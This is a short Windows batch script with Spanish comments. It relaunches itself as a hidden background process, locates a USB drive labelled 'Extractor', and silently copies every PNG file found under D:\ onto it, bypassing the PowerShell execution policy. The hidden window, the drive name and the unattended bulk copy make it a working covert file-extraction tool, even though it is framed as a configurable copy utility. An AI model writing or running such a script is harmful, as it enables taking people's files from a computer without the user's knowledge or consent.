@echo off

:: ====================================================
::               BLOQUE DE CONFIGURACION
:: ====================================================
:: Cambia estos parametros segun tus necesidades:

set "NOMBRE_USB=Extractor"
set "ORIGEN=D:\"
set "FILTRO=*.png"

:: ====================================================


:: Ejecutarse en segundo plano si no lo esta
if "%1" neq "hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
    exit
)

:: Buscar la letra de la unidad USB por su etiqueta
for /f "delims=" %%D in ('powershell -NoProfile -Command "(Get-Volume | Where-Object {$_.FileSystemLabel -eq '%NOMBRE_USB%'}).DriveLetter"') do (
    set DRIVE=%%D
)

:: Si no encuentra la USB con ese nombre, aborta el script
if "%DRIVE%"=="" exit

:: Definir la ruta raiz de la USB y la subcarpeta Data
set "DESTINO=%DRIVE%:\"
set "FOLDER_DATA=%DESTINO%Data"

:: COMPROBACION: Si la carpeta Data no existe en la USB, la crea
if not exist "%FOLDER_DATA%" (
    mkdir "%FOLDER_DATA%"
)

:: Copia masiva unificada usando las variables de configuracion
powershell -NoProfile -ExecutionPolicy Bypass -Command "$fotos = Get-ChildItem -Path '%ORIGEN%' -Recurse -File -Filter '%FILTRO%'; foreach ($foto in $fotos) { Copy-Item -Path $foto.FullName -Destination '%FOLDER_DATA%' -Force }"

exit